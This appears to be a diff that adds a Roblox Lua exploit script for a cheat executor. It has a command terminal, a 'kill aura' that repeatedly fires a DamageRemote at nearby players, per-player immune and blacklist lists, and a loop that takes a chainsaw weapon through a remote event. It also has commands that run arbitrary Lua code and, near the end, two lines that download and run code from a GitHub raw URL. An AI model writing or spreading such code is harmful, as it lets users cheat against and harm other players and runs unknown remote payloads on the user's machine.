@@ -1,0 +1,439 @@
+local terminalGui = Instance.new("ScreenGui")
+terminalGui.Name = "TerminalGui"
+terminalGui.Parent = game.CoreGui
+terminalGui.ResetOnSpawn = false
+local destroyed=false
+local terminalFrame = Instance.new("Frame")
+terminalFrame.Name = "TerminalFrame"
+terminalFrame.Size = UDim2.new(0.5, 0, 0.5, 0)
+terminalFrame.Position = UDim2.new(0.25, 0, 0.25, 0)
+terminalFrame.BackgroundTransparency = 0.5
+terminalFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+terminalFrame.BorderSizePixel = 0
+terminalFrame.Parent = terminalGui
+terminalFrame.Active = true
+terminalFrame.Draggable = true
+
+local inputBox = Instance.new("TextBox")
+inputBox.Name = "InputBox"
+inputBox.Size = UDim2.new(1, 0, 0, 30)
+inputBox.Position = UDim2.new(0, 0, 1, -30)
+inputBox.BackgroundTransparency = 0.5
+inputBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+inputBox.BorderSizePixel = 0
+inputBox.Font = Enum.Font.Code
+inputBox.TextSize = 18
+inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+inputBox.PlaceholderText = "Enter a command..."
+inputBox.ClearTextOnFocus = true
+inputBox.Parent = terminalFrame
+inputBox.Text = ""
+
+local outputBox = Instance.new("TextLabel")
+outputBox.Name = "OutputBox"
+outputBox.Size = UDim2.new(1, 0, 1, -30)
+outputBox.Position = UDim2.new(0, 0, 0, 0)
+outputBox.BackgroundTransparency = 1
+outputBox.Font = Enum.Font.Code
+outputBox.TextSize = 18
+outputBox.TextWrapped = true
+outputBox.Text = ""
+outputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+outputBox.TextXAlignment = Enum.TextXAlignment.Left
+outputBox.TextYAlignment = Enum.TextYAlignment.Top
+outputBox.Parent = terminalFrame
+
+local outputLabels = {}
+local startYPosition = 0
+
+
+-- Variable Initialization from the second script
+local r, ka, im, u, m = 15, false, {}, game.Players.LocalPlayer, game.Players.LocalPlayer
+
+-- Notification GUI Setup
+local ng = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+ng.Name = "NotificationGui"
+ng.ResetOnSpawn = false
+
+-- Notification Frame Setup
+local nf = Instance.new("Frame", ng)
+nf.Size, nf.Position, nf.AnchorPoint = UDim2.new(0.3, 0, 0.1, 0), UDim2.new(0.5, 0, 0.9, 0), Vector2.new(0.5, 0.5)
+nf.BackgroundColor3, nf.BackgroundTransparency, nf.BorderSizePixel, nf.BorderColor3, nf.Visible =
+    Color3.new(0, 0, 0), 0.5, 2, Color3.new(1, 1, 1), false
+
+-- Notification TextLabel Setup
+local nt = Instance.new("TextLabel", nf)
+nt.Size, nt.Position, nt.BackgroundTransparency, nt.TextColor3, nt.TextStrokeTransparency, nt.TextStrokeColor3,
+    nt.Font, nt.TextSize, nt.TextWrapped, nt.TextXAlignment =
+    UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0), 1, Color3.new(1, 1, 1), 0.75, Color3.new(0, 0, 0),
+    Enum.Font.SourceSansBold, 20, true, Enum.TextXAlignment.Center
+
+-- Range Part Setup
+local rangePart = Instance.new("Part", workspace)
+rangePart.Size, rangePart.Anchored, rangePart.BrickColor, rangePart.CanCollide = Vector3.new(1 * r, 1 * r, 1 * r), true, BrickColor.new("Bright blue"), false
+rangePart.Transparency = 0.5
+rangePart.Parent = workspace
+
+-- Notification Function
+local function showN(text)
+    nt.Text, nf.Visible = text, true
+    wait(3)
+    nf.Visible = false
+end
+
+-- Set Range Function
+local function setRange(newRange)
+    r, rangePart.Size = newRange, Vector3.new(1 * newRange, 1 * newRange, 1 * newRange)
+    return "Range set to: " .. r
+end
+
+-- Find Player Function
+local function fP(arg, partName)
+    for _, p in ipairs(game.Players:GetPlayers()) do
+        if p ~= m and (p.Name:lower():find(arg:lower()) or p.DisplayName:lower():find(arg:lower())) then
+            return partName and p.Character:FindFirstChild(partName) and p or p
+        end
+    end
+    return nil
+end
+
+-- Toggle Kill Aura Function
+local function tKA()
+    ka = not ka
+    return "Kill Aura " .. (ka and "Enabled" or "Disabled")
+end
+
+-- Change Player Function
+local function cP(arg)
+    local tp = nil
+    for _, p in ipairs(game.Players:GetPlayers()) do
+        if p ~= m and (p.Name:lower():find(arg:lower()) or p.DisplayName:lower():gsub("%s", ""):find(arg:lower():gsub("%s", ""))) then
+            tp = p
+            break
+        end
+    end
+    if tp then
+        u, m = tp, tp
+        return "Changed Player To:" .. tp.DisplayName
+    else
+        return "Player Not Found: " .. arg
+    end
+end
+
+-- Immune Function
+local function mI(arg)
+    local tp, _ = fP(arg)
+    if tp then
+        im[tp.Name] = true
+        return "Player found: " .. tp.DisplayName
+    end
+end
+
+-- Blacklist Function
+local function blP(arg)
+    local tp, _ = fP(arg)
+    if tp then
+        im[tp.Name] = nil
+        return "Player found: " .. tp.DisplayName
+    end
+end
+
+-- Player Left Function
+local function pL()
+    u, m, ka = true, game.Players.LocalPlayer, game.Players.LocalPlayer, false
+    showN("Target player left the game.")
+end
+local scriptisrunning = false
+function stopold(boo) scriptisrunning = not scriptisrunning if boo == true then return "Stopped old script." else return print("hi") end end
+function dmg()
+    if game.Players.LocalPlayer and game.Players.LocalPlayer.Backpack and workspace then
+                while wait() do
+                    if ka and not tl then
+                        local tpc = u.Character
+                        if tpc and tpc:FindFirstChild("Humanoid") then
+                            for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                                if v:FindFirstChild("DamageRemote") then
+                                    local targ, range = nil, r
+                                    for i, v in pairs(workspace:GetChildren()) do
+                                        if v ~= tpc then
+                                            local vhum, vroot = v:FindFirstChild("Humanoid"), v:FindFirstChild("HumanoidRootPart")
+                                            if vhum and vroot then
+                                                local dist = (vroot.Position - tpc.HumanoidRootPart.Position).magnitude
+                                                if vhum.Health > 0 and dist <= range and not im[v.Name] then
+                                                    targ, range = vhum, dist
+                                                end
+                                            end
+                                        end
+                                    end
+                                    game:GetService("RunService").Heartbeat:Wait()
+                                    if targ then
+                                        v.DamageRemote:FireServer(targ)
+                                        v.DamageRemote:FireServer(targ)
+                                        v.DamageRemote:FireServer(targ)
+                                        v.DamageRemote:FireServer(targ)
+                                        v.DamageRemote:FireServer(targ)
+                                        v.DamageRemote:FireServer(targ)
+                                    end
+                                end
+                            end
+                        else
+                            if not tpc then
+                                pL()
+                            end
+                        end
+                    end
+                end
+            else
+                wait(5)
+            end
+end
+-- Main Execution Loop
+local function eS()
+    scriptisrunning = true
+    spawn(function()
+        while wait() do
+            if scriptisrunning == false then
+                break
+            end
+            dmg()
+        end
+    end)
+end
+
+-- Execute Main Loop
+spawn(function()
+    eS()
+    eS()
+    eS()
+end)
+local function executeCommand(command)
+    local result = ""
+
+    if command:sub(1, 4) == "get " then
+        local arg = command:sub(5)
+        if arg then
+            if isfile(arg) then
+                result = pcall(loadstring(readfile(arg))())
+                result = "Ran File " .. arg
+            else
+                result = "<ERROR> " .. arg .. " Doesn't exist"
+            end
+        else
+            result = "<ERROR> No argument!"
+        end
+    elseif command:sub(1, 5) == "load " then
+        local arg = command:sub(6)
+        if arg then
+            local exec = pcall(loadstring(arg)())
+            result = "Ran code " .. arg
+        else
+            result = "<ERROR> No code input"
+        end
+    elseif command:sub(1, 5) == "save " then
+        local filename, content = command:match("^save%s+(%S+)%s+%s+(.*)$")
+        if filename and content then
+            writefile(filename, content)
+            result = "Saved file '" .. filename .. "'"
+        else
+            result = "<ERROR> Invalid arguments for 'save' command"
+        end
+    elseif command:sub(1, 5) == "copy " then
+        local filename, file = command:match("^copy%s+(%S+)%s+as%s+(.*)$")
+        if filename and file then
+            writefile(file, readfile(filename))
+            result = "Copied file '" .. filename .. "' as '" .. file .. "'"
+        else
+            result = "<ERROR> Invalid arguments for 'copy' command"
+        end
+    elseif command:sub(1, 8) == "setrange" then
+        local newRange = tonumber(command:match("%d+"))
+        if newRange then
+            r = newRange
+            result = "Range set to: " .. r
+        else
+            result = "<ERROR> Invalid range value"
+        end
+    elseif command:sub(1, 7) == "cplayer" then
+        local playerName = command:match("^cplayer%s+(.+)$")
+        if playerName then
+            result = cP(playerName)
+        else
+            result = "<ERROR> No player name specified"
+        end
+    elseif command:sub(1, 9) == "toggleka" then
+        result = tKA()
+    elseif command:sub(1, 6) == "immune" then
+        local playerName = command:match("^immune%s+(.+)$")
+        if playerName then
+            result = mI(playerName)
+        else
+            result = "<ERROR> No player name specified"
+        end
+    elseif command:sub(1, 9) == "blacklist" then
+        local playerName = command:match("^blacklist%s+(.+)$")
+        if playerName then
+            result = blP(playerName)
+        else
+            result = "<ERROR> No player name specified"
+        end
+    elseif command:sub(1, 8) == "rescript" then
+        result = stopold(true)
+        eS()
+        eS()
+        eS()
+    elseif command:sub(1, 7) == "destroy" then
+       stopold(false)
+       destroyed = true
+       terminalGui:Destroy() 
+    end
+    if result == "" then
+        return command
+    else
+        return result
+    end
+end
+inputBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local command = inputBox.Text
+        inputBox.Text = ""
+        local result = executeCommand(command)
+        
+        local outputLabel = outputBox:Clone()
+        outputLabel.Text = result
+        outputLabel.Position = UDim2.new(0, 0, 0, startYPosition)
+        outputLabel.Parent = terminalFrame
+        table.insert(outputLabels, outputLabel)
+
+        startYPosition = startYPosition - outputLabel.Size.Y.Offset - 10
+
+        if startYPosition > terminalFrame.AbsoluteSize.Y - 20 then
+            startYPosition = 0
+            for i, label in ipairs(outputLabels) do
+                label:Destroy()
+                outputLabels[i] = nil
+            end
+        end
+    end
+end)
+local playerListGui = Instance.new("ScreenGui")
+playerListGui.Name = "PlayerListGui"
+playerListGui.Parent = game.CoreGui
+playerListGui.ResetOnSpawn = false
+
+local playerListFrame = Instance.new("Frame")
+playerListFrame.Size = UDim2.new(0, 200, 0, 150)
+playerListFrame.Position = UDim2.new(1, -210, 0, 10)
+playerListFrame.BackgroundTransparency = 0.5
+playerListFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+playerListFrame.BorderSizePixel = 0
+playerListFrame.Draggable = true
+playerListFrame.Active = true-- Make the frame draggable
+playerListFrame.Parent = playerListGui
+
+local playerCountLabel = Instance.new("TextLabel")
+playerCountLabel.Size = UDim2.new(1, 0, 0, 20)
+playerCountLabel.Position = UDim2.new(0, 0, 0, 0)
+playerCountLabel.BackgroundTransparency = 1
+playerCountLabel.Font = Enum.Font.SourceSansBold
+playerCountLabel.TextSize = 14
+playerCountLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+playerCountLabel.TextStrokeTransparency = 0.5
+playerCountLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+playerCountLabel.TextXAlignment = Enum.TextXAlignment.Left
+playerCountLabel.Text = ""
+playerCountLabel.Parent = playerListFrame
+
+local localPlayerLabel = Instance.new("TextLabel")
+localPlayerLabel.Size = UDim2.new(1, 0, 0, 20)
+localPlayerLabel.Position = UDim2.new(0, 0, 0.085, 0)
+localPlayerLabel.BackgroundTransparency = 1
+localPlayerLabel.Font = Enum.Font.SourceSansBold
+localPlayerLabel.TextSize = 14
+localPlayerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+localPlayerLabel.TextStrokeTransparency = 0.5
+localPlayerLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+localPlayerLabel.TextXAlignment = Enum.TextXAlignment.Left
+localPlayerLabel.Text = "Ping: nil"
+localPlayerLabel.Parent = playerListFrame
+
+local playerListScrollingFrame = Instance.new("ScrollingFrame")
+playerListScrollingFrame.Size = UDim2.new(1, 0, 0.8, 0) -- Adjust the Y size here (0.8)
+playerListScrollingFrame.Position = UDim2.new(0, 0, 0.2, 0)
+playerListScrollingFrame.BackgroundTransparency = 1
+playerListScrollingFrame.BorderSizePixel = 0
+playerListScrollingFrame.ScrollBarThickness = 0
+playerListScrollingFrame.ScrollingDirection = Enum.ScrollingDirection.Y -- Only allow vertical scrolling
+playerListScrollingFrame.Parent = playerListFrame
+
+local playerListLabel = Instance.new("TextLabel")
+playerListLabel.Size = UDim2.new(1, 0, 0, 0)
+playerListLabel.Position = UDim2.new(0, 0, 0, 0)
+playerListLabel.BackgroundTransparency = 1
+playerListLabel.Font = Enum.Font.SourceSansBold
+playerListLabel.TextSize = 14
+playerListLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+playerListLabel.TextStrokeTransparency = 0.5
+playerListLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+playerListLabel.TextXAlignment = Enum.TextXAlignment.Left
+playerListLabel.TextYAlignment = Enum.TextYAlignment.Top
+playerListLabel.Parent = playerListScrollingFrame
+
+local destroy = Instance.new("TextButton")
+destroy.Size = UDim2.new(0, 20, 0, 20)
+destroy.Position = UDim2.new(0.9, 0, 0, 0)
+destroy.Text = "X"
+destroy.TextColor3 = Color3.fromRGB(255, 255, 255)
+destroy.Font = Enum.Font.SourceSansBold
+destroy.TextSize = 14
+destroy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+destroy.BorderSizePixel = 0
+destroy.BackgroundTransparency = 1
+destroy.Parent = playerListFrame
+
+-- Function to update player list and adjust CanvasSize
+local function updatePlayerList()
+    local players = game.Players:GetPlayers()
+    local playerNames = {}
+    for _, player in ipairs(players) do
+        table.insert(playerNames, player.Name)
+    end
+    playerListLabel.Text = "Player List:\n" .. table.concat(playerNames, "\n")
+    playerListLabel.Size = UDim2.new(1, 0, 0, playerListLabel.TextBounds.Y)
+    playerListScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, playerListLabel.TextBounds.Y)
+    playerCountLabel.Text = "Player Count: " .. #players
+    local ping = string.format("%0.0f", game.Players.LocalPlayer:GetNetworkPing()*1000)
+    localPlayerLabel.Text = "Ping: " .. ping
+end
+
+-- Update player list initially
+updatePlayerList()
+
+-- Connect minimize button to toggle visibility of the player list frame
+destroy.MouseButton1Click:Connect(function()
+    playerListGui:Destroy()
+end)
+spawn(function()
+    while wait() do
+        updatePlayerList()
+    end
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/theweakestskid/e/main/info.txt",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/theweakestskid/e/main/cx1",true))()
+spawn(function()
+while wait() do
+    local plgui = game:GetService("Players").LocalPlayer.PlayerGui
+    if plgui:FindFirstChild("WeaponSelect Gui") then
+        plgui:FindFirstChild("WeaponSelect Gui").Menu.GiveWeapon:FireServer("Chainsaw")
+        plgui:FindFirstChild("WeaponSelect Gui"):Destroy()
+    end
+end
+end)
+while wait(360) do
+if destroyed then
+break
+end
+stopold(false)
+        eS()
+        eS()
+        eS()
+        end
